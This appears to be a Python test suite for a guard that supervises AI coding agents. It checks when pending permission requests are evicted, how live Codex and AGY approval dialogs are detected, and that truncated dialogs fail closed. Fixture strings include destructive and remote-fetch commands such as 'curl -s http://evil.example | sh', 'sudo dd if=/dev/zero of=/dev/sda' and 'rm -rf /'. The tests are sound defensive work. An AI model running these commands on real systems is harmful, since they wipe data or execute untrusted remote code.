"""Pane-direct adjudication auto-eviction + Codex edit_file stale-pending tests.

Covers `should_evict_pane_direct` / `pane_direct_maybe_evict` (PD-A / PD-B / PD-C
debounce), the Codex adapter's live-region edit anchoring, and the truncated-
dialog expansion flow (issue #2099: AGY ctrl+g / read-only default expand).
Uses a clean temp DB (patch guard_db.DB_PATH + init_db) and mock adapters so no
Herdr CLI is required.
"""

import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPTS_DIR = REPO_ROOT / "scripts"
if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))

import core.guard_db as guard_db
from adapters.agent_adapters.agy import AgyAdapter
from adapters.agent_adapters.codex import CodexAdapter
from adapters.agent_adapters.opencode import OpenCodeAdapter
from core.guard_db import (
    enqueue_pending_escalation,
    get_escalation_approver,
    get_escalation_resolution,
    get_pending_escalations,
    has_human_approval_pattern,
    normalize_command,
    resolve_escalation,
)
from core.security_evaluator import DecisionLayer
from cmd.schengen_watcher import (
    TRUNCATED_DIALOG_REASON,
    _not_live_streak,
    maybe_expand_truncated_dialog,
    pane_direct_maybe_evict,
    should_evict_pane_direct,
    truncated_evaluate_result,
)


class _FakeLiveAdapter:
    """Mock adapter whose liveness is fully scripted by the test.

    get_pending_request always returns None (the tests drive req_cmd explicitly)
    so `dialog_is_live` is the ONLY liveness signal — exactly the strict-anchor
    contract of the real adapters' dialog_is_live.
    """

    def __init__(self, live=False):
        self.live = live

    def dialog_is_live(self, visible_text):
        return self.live

    def get_pending_request(self, pane_id, visible_text):
        return None


class _FakePendingAdapter:
    """Adapter that reports a pending request while claiming the dialog NOT live.

    Mirrors the codex stale-footer window: get_pending_request still parses a
    request (footer present) but dialog_is_live is False (focused-row marker
    gone) — the PD-C debounce scenario.
    """

    def __init__(self, req_cmd):
        self.req_cmd = req_cmd

    def dialog_is_live(self, visible_text):
        return False

    def get_pending_request(self, pane_id, visible_text):
        return self.req_cmd


class TestPaneDirectEviction(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db_path = Path(self.temp_dir.name) / "test_guard.db"

        self.db_patch = patch.object(guard_db, "DB_PATH", self.db_path)
        self.db_patch.start()
        guard_db.init_db()
        _not_live_streak.clear()

    def tearDown(self):
        _not_live_streak.clear()
        self.db_patch.stop()
        self.temp_dir.cleanup()

    def _enqueue(self, pane_id, cmd, layer="GRAY_ZONE"):
        return enqueue_pending_escalation(
            pane_id=pane_id,
            raw_command=cmd,
            safety_reason="test escalation",
            decision_layer=layer,
            agent_kind="codex",
        )

    # ---- PD-A: dialog gone -------------------------------------------------

    def test_dialog_gone_evicts_with_provenance_and_no_adjudication(self):
        pane_id = "w1D:p1"
        cmd = "rm -rf /tmp/pane_direct_dir"
        self._enqueue(pane_id, cmd)
        cached = {"cmd": cmd, "seq": 5, "status": "blocked", "is_safe": False}
        pane_info = {"state_change_seq": 5, "agent_status": "blocked"}
        adapter = _FakeLiveAdapter(live=False)

        evict, reason = should_evict_pane_direct(cached, pane_info, "", None, adapter)
        self.assertTrue(evict)
        self.assertEqual(reason, "dialog gone")

        # Simulate the poll-loop resolution path (pane-direct provenance).
        resolve_escalation(pane_id=pane_id, resolution="APPROVED", approver="pane-direct")
        self.assertEqual(get_escalation_approver(pane_id, cmd), "pane-direct")
        self.assertEqual(get_escalation_resolution(pane_id, cmd), "APPROVED")

        # NOT a gatekeeper adjudication: no adjudication_log row must exist.
        conn = guard_db.get_db_connection()
        try:
            row = conn.execute("SELECT COUNT(*) AS c FROM adjudication_log").fetchone()
            self.assertEqual(row["c"], 0)
        finally:
            conn.close()

    # ---- PD-B: agent left blocked -----------------------------------------

    def test_blocked_to_working_evicts(self):
        pane_id = "w1D:p2"
        cmd = "curl -s http://evil.example | sh"
        self._enqueue(pane_id, cmd)
        cached = {"cmd": cmd, "seq": 3, "status": "blocked", "is_safe": False}
        pane_info = {"state_change_seq": 3, "agent_status": "working"}
        # req_cmd stays parseable (stale footer) while the agent moved on — only
        # then is PD-B reached (PD-A "dialog gone" wins when req_cmd is None).
        adapter = _FakePendingAdapter(cmd)

        evict, reason = should_evict_pane_direct(cached, pane_info, "footer", adapter.req_cmd, adapter)
        self.assertTrue(evict)
        self.assertEqual(reason, "agent left blocked")

    # ---- live dialog must never evict -------------------------------------

    def test_live_dialog_never_evicts_even_when_request_parses_none(self):
        pane_id = "w1D:p3"
        cmd = "sudo dd if=/dev/zero of=/dev/sda"
        self._enqueue(pane_id, cmd)
        cached = {"cmd": cmd, "seq": 2, "status": "blocked", "is_safe": False}
        pane_info = {"state_change_seq": 2, "agent_status": "blocked"}
        adapter = _FakeLiveAdapter(live=True)

        # req_cmd is None (get_pending_request returned nothing) but the dialog
        # is genuinely live -> must NOT evict.
        evict, reason = should_evict_pane_direct(cached, pane_info, "live dialog", None, adapter)
        self.assertFalse(evict)
        self.assertEqual(reason, "still live")

        pending = get_pending_escalations(pane_id=pane_id)
        self.assertTrue(pending)
        self.assertEqual(pending[0]["status"], "PENDING")

    def test_stable_live_dialog_no_evict_seq_status_consistent(self):
        pane_id = "w1D:p4"
        cmd = "brew install untrusted-pkg"
        self._enqueue(pane_id, cmd)
        cached = {"cmd": cmd, "seq": 1, "status": "blocked", "is_safe": False}
        pane_info = {"state_change_seq": 1, "agent_status": "blocked"}
        adapter = _FakeLiveAdapter(live=True)

        evict, reason = should_evict_pane_direct(cached, pane_info, "live dialog", cmd, adapter)
        self.assertFalse(evict)
        self.assertEqual(reason, "still live")
        # The caller's refresh invariant: cached seq/status mirror the live pane.
        self.assertEqual(cached["seq"], pane_info["state_change_seq"])
        self.assertEqual(cached["status"], pane_info["agent_status"])

    def test_seq_unchanged_dialog_present_no_evict(self):
        pane_id = "w1D:p6"
        cmd = "git push --force"
        self._enqueue(pane_id, cmd)
        cached = {"cmd": cmd, "seq": 7, "status": "blocked", "is_safe": False}
        pane_info = {"state_change_seq": 7, "agent_status": "blocked"}
        adapter = _FakeLiveAdapter(live=True)

        evict, reason = should_evict_pane_direct(cached, pane_info, "live dialog", cmd, adapter)
        self.assertFalse(evict)
        self.assertEqual(reason, "still live")

    # ---- provenance: no novelty seed --------------------------------------

    def test_eviction_provenance_no_novelty_seed(self):
        pane_id = "w1D:p7"
        cmd = "rm -rf /tmp/nonexistent"
        self._enqueue(pane_id, cmd)
        cached = {"cmd": cmd, "seq": 4, "status": "blocked", "is_safe": False}
        pane_info = {"state_change_seq": 4, "agent_status": "blocked"}
        adapter = _FakeLiveAdapter(live=False)

        evict, reason = should_evict_pane_direct(cached, pane_info, "", None, adapter)
        self.assertTrue(evict)
        resolve_escalation(pane_id=pane_id, resolution="APPROVED", approver="pane-direct")
        self.assertEqual(get_escalation_approver(pane_id, cmd), "pane-direct")
        self.assertEqual(get_escalation_resolution(pane_id, cmd), "APPROVED")

        # record_human_approval_pattern must NOT have been seeded: the novelty
        # gate stays empty for this scope+pattern (auto-eviction is not a human
        # approval signal — it must not create a HUMAN_APPROVED fast path).
        self.assertFalse(has_human_approval_pattern(normalize_command(cmd), scope=pane_id))

    # ---- Codex edit_file stale-pending ------------------------------------

    def test_codex_edit_completed_is_not_live_and_not_parsed(self):
        adapter = CodexAdapter()
        # Scrollback STILL holds the edit header + Destination line, but the
        # focused-row marker '› 1. Yes' is gone from the tail (edit completed).
        scrollback = (
            "User: please update the config file.\n"
            "Would you like to make the following edits?\n"
            "  Destination: /path/to/file.py\n"
            "  1. Yes\n"
            "  2. No\n"
            "Press enter to confirm or esc to cancel\n"
            "Edit applied successfully.\n"
        )
        self.assertIsNone(adapter.parse_permission_request(scrollback))
        self.assertFalse(adapter.dialog_is_live(scrollback))

    def test_codex_edit_live_is_parsed_and_live(self):
        adapter = CodexAdapter()
        live = (
            "Would you like to make the following edits?\n\n"
            "Description: Apply proposed file edits\n"
            "Destination: /path/to/file.py\n\n"
            "  + def new_feature():\n"
            "  +     pass\n"
            "› 1. Yes\n"
            "  2. No\n"
            "Press enter to confirm or esc to cancel\n"
        )
        self.assertEqual(adapter.parse_permission_request(live), "edit_file /path/to/file.py")
        self.assertTrue(adapter.dialog_is_live(live))

    def test_codex_command_dialog_focused_on_non_yes_not_evicted(self):
        # INV-PD-1 (reviewer finding): a genuinely live dialog whose focus was
        # navigated to a non-Yes row ('› 2. No') must NEVER be treated as
        # answered. The exec regex requires "1. Yes" so parse returns None, but
        # the presence of the '›' focus marker proves the dialog is live —
        # should_evict_pane_direct must return (False, "still live").
        adapter = CodexAdapter()
        text = (
            "Would you like to run the following command?\n"
            "  $ rm -rf /tmp/navigated_dir\n"
            "› 2. No, and tell Codex what to do differently (esc)\n"
            "Press enter to confirm or esc to cancel\n"
        )
        self.assertIsNone(adapter.parse_permission_request(text))
        self.assertTrue(adapter.dialog_is_live(text))

        pane_id = "w1D:p10"
        cmd = "rm -rf /tmp/navigated_dir"
        self._enqueue(pane_id, cmd)
        cached = {"cmd": cmd, "seq": 11, "status": "blocked", "is_safe": False}
        pane_info = {"state_change_seq": 11, "agent_status": "blocked"}
        evict, reason = should_evict_pane_direct(cached, pane_info, text, None, adapter)
        self.assertFalse(evict)
        self.assertEqual(reason, "still live")

    def test_codex_edit_dialog_focused_on_non_yes_stays_live(self):
        # Same INV-PD-1 invariant for the EDIT dialog: focus on '› 2. No' keeps
        # the edit region live (parseable) and the escalation is NOT evicted.
        adapter = CodexAdapter()
        text = (
            "Would you like to make the following edits?\n\n"
            "Description: Apply proposed file edits\n"
            "Destination: /path/to/file.py\n\n"
            "› 2. No\n"
            "Press enter to confirm or esc to cancel\n"
        )
        self.assertEqual(adapter.parse_permission_request(text), "edit_file /path/to/file.py")
        self.assertTrue(adapter.dialog_is_live(text))

        pane_id = "w1D:p11"
        cmd = "edit_file /path/to/file.py"
        self._enqueue(pane_id, cmd)
        cached = {"cmd": cmd, "seq": 12, "status": "blocked", "is_safe": False}
        pane_info = {"state_change_seq": 12, "agent_status": "blocked"}
        evict, reason = should_evict_pane_direct(cached, pane_info, text, cmd, adapter)
        self.assertFalse(evict)
        self.assertEqual(reason, "still live")

    # ---- PD-C debounce (regression) ---------------------------------------

    def test_pd_c_debounce_requires_consecutive_not_live_polls(self):
        pane_id = "w1D:p8"
        cmd = "python3 -c 'import os; os.remove(\"/tmp/x\")'"
        self._enqueue(pane_id, cmd)
        cached = {"cmd": cmd, "seq": 9, "status": "blocked", "is_safe": False}
        # state changed (seq 9 -> 10) while the dialog is NOT live -> PD-C.
        pane_info = {"state_change_seq": 10, "agent_status": "blocked"}
        adapter = _FakePendingAdapter(cmd)

        # First transient not-live poll: debounced, NOT evicted.
        evict, reason = pane_direct_maybe_evict(
            pane_id, cached, pane_info, "footer text", adapter.req_cmd, adapter, confirm_polls=2,
        )
        self.assertFalse(evict)
        self.assertTrue(reason.startswith("debounced"))
        self.assertEqual(_not_live_streak.get(pane_id), 1)

        # Second consecutive not-live poll: evicted.
        evict2, reason2 = pane_direct_maybe_evict(
            pane_id, cached, pane_info, "footer text", adapter.req_cmd, adapter, confirm_polls=2,
        )
        self.assertTrue(evict2)
        self.assertEqual(reason2, "state changed, dialog not live")
        self.assertNotIn(pane_id, _not_live_streak)

    def test_pd_c_streak_resets_on_live_dialog(self):
        pane_id = "w1D:p9"
        cmd = "sudo rm -rf /var/tmp/stale"
        self._enqueue(pane_id, cmd)
        cached = {"cmd": cmd, "seq": 9, "status": "blocked", "is_safe": False}
        pane_info = {"state_change_seq": 10, "agent_status": "blocked"}
        stale = _FakePendingAdapter(cmd)

        # One debounced not-live poll...
        evict, _ = pane_direct_maybe_evict(
            pane_id, cached, pane_info, "footer", stale.req_cmd, stale, confirm_polls=2,
        )
        self.assertFalse(evict)
        self.assertEqual(_not_live_streak.get(pane_id), 1)

        # ...then the dialog comes back LIVE -> streak reset, never evicted.
        live_adapter = _FakeLiveAdapter(live=True)
        evict2, reason2 = pane_direct_maybe_evict(
            pane_id, cached, pane_info, "live dialog", cmd, live_adapter, confirm_polls=2,
        )
        self.assertFalse(evict2)
        self.assertEqual(reason2, "still live")
        self.assertNotIn(pane_id, _not_live_streak)


class _FakeExpandAdapter:
    """Adapter stub driving the watcher's truncation-expand flow (#2099).

    is_truncated is content-driven (marker presence, mirroring the real agy
    fold marker); expand_dialog / get_pending_request are scripted. The expand
    call count asserts the single-bounded-attempt invariant (INV-EX-4).
    """

    def __init__(self, expanded_text=None, expanded_req=None, trunc_marker="⋯"):
        self.expanded_text = expanded_text
        self.expanded_req = expanded_req
        self.trunc_marker = trunc_marker
        self.expand_calls = 0

    def is_truncated(self, visible_text):
        return self.trunc_marker in visible_text

    def expand_dialog(self, pane_id):
        self.expand_calls += 1
        return self.expanded_text

    def get_pending_request(self, pane_id, visible_text):
        return self.expanded_req


class TestDialogExpansion(unittest.TestCase):
    """Truncated-dialog expansion flow (issue #2099, INV-EX-1..5)."""

    # ---- adapter primitives ----------------------------------------------

    def test_agy_is_truncated_detects_fold_marker(self):
        adapter = AgyAdapter()
        self.assertTrue(adapter.is_truncated("⋯ 3 lines hidden"))
        self.assertTrue(adapter.is_truncated("⋯ lines hidden"))
        self.assertTrue(adapter.is_truncated("… 3 lines hidden"))  # U+2026 horizontal ellipsis
        self.assertTrue(adapter.is_truncated("Requesting permission for: rm -rf /\n⋯5 lines hidden"))
        self.assertFalse(adapter.is_truncated("Requesting permission for: rm -rf /\nDo you want to proceed?\n> 1. Yes"))

    def test_agy_expand_dialog_sends_ctrl_g_then_full_read(self):
        adapter = AgyAdapter()
        full_text = "Requesting permission for: rm -rf /tmp/x\nDo you want to proceed?\n> 1. Yes"
        with patch("adapters.agent_adapters.agy.run_cmd", return_value="") as mock_run, patch(
            "adapters.agent_adapters.agy.get_pane_text", return_value=full_text
        ) as mock_read:
            result = adapter.expand_dialog("w1D:p1")
        self.assertEqual(result, full_text)
        # ctrl+g FIRST (materializes the fold), THEN the full-scrollback read.
        mock_run.assert_called_once_with(["herdr", "agent", "send-keys", "w1D:p1", "ctrl+g"])
        mock_read.assert_called_once_with("w1D:p1", lines=500, full_dump=True)

    def test_default_expand_dialog_read_only_no_keystroke(self):
        # Regression: the DEFAULT expand (opencode/codex) must never send a
        # disruptive ctrl+f / ctrl+a — only a full-scrollback read.
        full_text = "Permission required\n$ ls\nAllow once"
        with patch("adapters.agent_adapters.base.get_pane_text", return_value=full_text) as mock_read, patch(
            "adapters.herdr_client.run_cmd"
        ) as mock_run:
            result = OpenCodeAdapter().expand_dialog("w1D:p2")
        self.assertEqual(result, full_text)
        mock_run.assert_not_called()  # NO keystroke
        mock_read.assert_called_once_with("w1D:p2", lines=500, full_dump=True)

        with patch("adapters.agent_adapters.base.get_pane_text", return_value=full_text) as mock_read2, patch(
            "adapters.herdr_client.run_cmd"
        ) as mock_run2:
            result2 = CodexAdapter().expand_dialog("w1D:p2")
        self.assertEqual(result2, full_text)
        mock_run2.assert_not_called()
        mock_read2.assert_called_once_with("w1D:p2", lines=500, full_dump=True)

    # ---- watcher expand flow ---------------------------------------------

    def test_expand_none_or_empty_treated_as_failure(self):
        adapter = _FakeExpandAdapter(expanded_text=None)
        text, req, unrecoverable = maybe_expand_truncated_dialog(
            adapter, "w1D:p3", "⋯ 3 lines hidden", "partial-cmd"
        )
        self.assertTrue(unrecoverable)  # INV-EX-3: fail-closed
        self.assertEqual(req, "partial-cmd")  # truncated req NEVER swapped in
        self.assertEqual(adapter.expand_calls, 1)

        adapter_empty = _FakeExpandAdapter(expanded_text="")
        _text, req2, unrecoverable2 = maybe_expand_truncated_dialog(
            adapter_empty, "w1D:p3", "⋯ 3 lines hidden", "partial-cmd"
        )
        self.assertTrue(unrecoverable2)

    def test_watcher_expand_success_threads_expanded_req(self):
        adapter = _FakeExpandAdapter(
            expanded_text="full dialog text", expanded_req="rm -rf /tmp/full"
        )
        text, req, unrecoverable = maybe_expand_truncated_dialog(
            adapter, "w1D:p5", "⋯ 3 lines hidden", "rm -rf /tmp/trun"
        )
        self.assertFalse(unrecoverable)
        self.assertEqual(req, "rm -rf /tmp/full")  # evaluate receives the EXPANDED req_cmd
        self.assertEqual(text, "full dialog text")  # expanded text becomes the snapshot
        self.assertEqual(adapter.expand_calls, 1)

    def test_watcher_expand_failure_evaluates_fail_closed(self):
        adapter = _FakeExpandAdapter(expanded_text=None)
        _text, req, unrecoverable = maybe_expand_truncated_dialog(
            adapter, "w1D:p6", "⋯ 3 lines hidden", "partial-cmd"
        )
        self.assertTrue(unrecoverable)
        # The watcher's evaluate closure short-circuits to truncated_evaluate_result()
        # BEFORE any allowlist/AST check (INV-EX-2/3).
        result = truncated_evaluate_result()
        self.assertFalse(result[0])
        self.assertEqual(result[1], TRUNCATED_DIALOG_REASON)
        self.assertEqual(result[1], "Truncated dialog could not be expanded; requires human review")
        self.assertEqual(result[2], DecisionLayer.NOT_ALLOWLISTED)

    def test_watcher_still_truncated_single_attempt_no_retry(self):
        # Expanded text is STILL truncated -> fail-closed, ONE expand attempt.
        adapter = _FakeExpandAdapter(expanded_text="⋯ 2 lines hidden")
        _text, req, unrecoverable = maybe_expand_truncated_dialog(
            adapter, "w1D:p7", "⋯ 3 lines hidden", "partial-cmd"
        )
        self.assertTrue(unrecoverable)  # INV-EX-3
        self.assertEqual(adapter.expand_calls, 1)  # INV-EX-4: no retry loop

    def test_non_truncated_never_expands(self):
        adapter = _FakeExpandAdapter()
        text, req, unrecoverable = maybe_expand_truncated_dialog(
            adapter, "w1D:p8", "full dialog text", "full-cmd"
        )
        self.assertFalse(unrecoverable)
        self.assertEqual(req, "full-cmd")
        self.assertEqual(text, "full dialog text")
        self.assertEqual(adapter.expand_calls, 0)  # expand_dialog NOT called (no regression)


class TestDialogLivenessPrecision(unittest.TestCase):
    """Anchor-completeness + variable-window liveness (#7771 AGY / #7938 Codex).

    A live agent dialog must NEVER be misread as not-live: the AGY anchor set
    is a tail-anchored superset of every dialog marker, and the Codex focused-
    row search uses a header-anchored variable window (no fixed [-400:] tail
    that a long command or trailing scrollback can overflow).
    """

    # ---- AGY (#7771): anchor completeness ---------------------------------

    def test_agy_dialog_is_live_standard_prompt(self):
        # Standard "Requesting permission for: ... Do you want to proceed?" with
        # plain "1. Yes" (NO '>' focus marker) must still be LIVE.
        text = (
            "Requesting permission for: rm -rf /tmp/x\n"
            "Do you want to proceed?\n"
            "1. Yes\n"
            "2. No\n"
        )
        self.assertTrue(AgyAdapter().dialog_is_live(text))

    def test_agy_dialog_is_live_all_patterns(self):
        cases = [
            "Pending edit\n────────────\n/tmp/file.py\nAccept this file edit?",   # file-edit dialog
            "Allow creation of this file?\n/path/to/new.py",                      # file-create dialog
            "Do you want to run 'sudo reboot'?",                                  # exec-quote dialog
            "How's the CLI experience so far?\n[0] Skip",                         # survey dialog
            "> 1. Yes\n> 2. No",                                                 # focused option row
            "Execute command?\nrm -rf /tmp/y\n[y/N]",                            # execute prompt
        ]
        for t in cases:
            self.assertTrue(AgyAdapter().dialog_is_live(t), f"expected live: {t!r}")

    def test_agy_dialog_is_live_false_when_cleared(self):
        # A cleared dialog — none of the anchors in the tail — is NOT live.
        cleared = (
            "rm -rf /tmp/x\n"
            "command completed successfully\n"
            "next output line\n"
            "more scrollback\n"
        )
        self.assertFalse(AgyAdapter().dialog_is_live(cleared))

    # ---- Codex (#7938): variable tail window ------------------------------

    def test_codex_dialog_is_live_long_command(self):
        # A long command body PLUS trailing scrollback pushes the '› 1. Yes'
        # marker beyond a fixed [-400:] tail window — the header-anchored
        # region search must still report LIVE.
        body = "echo " + "x" * 500
        text = (
            "Would you like to run the following command?\n"
            f"  $ {body}\n"
            "› 1. Yes, proceed (y)\n"
            "  2. No, and tell Codex what to do differently (esc)\n"
            "Press enter to confirm or esc to cancel\n"
            + "out: " + "z" * 500 + "\n"  # trailing output after the dialog
        )
        # Sanity: the marker is genuinely outside the last 400 chars.
        self.assertNotIn("› 1. Yes", text[-400:])
        self.assertTrue(CodexAdapter().dialog_is_live(text))

    def test_codex_dialog_is_live_boundary(self):
        # Marker near the tail-window boundary (inside it) — still live.
        text = (
            "Would you like to run the following command?\n"
            "  $ echo hi\n"
            "› 1. Yes, proceed (y)\n"
            "  2. No, and tell Codex what to do differently (esc)\n"
            "Press enter to confirm or esc to cancel\n"
            + "out: " + "z" * 250 + "\n"
        )
        self.assertIn("› 1. Yes", text[-400:])
        self.assertTrue(CodexAdapter().dialog_is_live(text))

    def test_codex_dialog_is_live_short_still_live(self):
        text = (
            "Would you like to run the following command?\n"
            "  $ echo hi\n"
            "› 1. Yes, proceed (y)\n"
            "  2. No, and tell Codex what to do differently (esc)\n"
            "Press enter to confirm or esc to cancel\n"
        )
        self.assertTrue(CodexAdapter().dialog_is_live(text))

    def test_codex_dialog_is_live_completed_false(self):
        # Footer present but the focused-row '›' marker is GONE (completed
        # dialog lingering in scrollback) -> NOT live.
        text = (
            "Would you like to run the following command?\n"
            "  $ echo hi\n"
            "  1. Yes, proceed (y)\n"
            "  2. No, and tell Codex what to do differently (esc)\n"
            "Press enter to confirm or esc to cancel\n"
        )
        self.assertFalse(CodexAdapter().dialog_is_live(text))

    def test_codex_edit_long_diff_still_live(self):
        # A multi-file edit dialog with a LONG diff body + trailing scrollback:
        # the live-region search must still find the marker and parse the
        # destination (old fixed [-400:] window would return None).
        diff = "".join(f"  + line {i} of the diff\n" for i in range(60))
        text = (
            "Would you like to make the following edits?\n\n"
            "Destination: /repo/scripts/core/x.py\n\n"
            + diff
            + "› 1. Yes, proceed (y)\n"
            "Press enter to confirm or esc to cancel\n"
            + "out: " + "q" * 500 + "\n"
        )
        self.assertNotIn("› 1. Yes", text[-400:])
        adapter = CodexAdapter()
        self.assertEqual(adapter.parse_permission_request(text), "edit_file /repo/scripts/core/x.py")
        self.assertTrue(adapter.dialog_is_live(text))


if __name__ == "__main__":
    unittest.main()
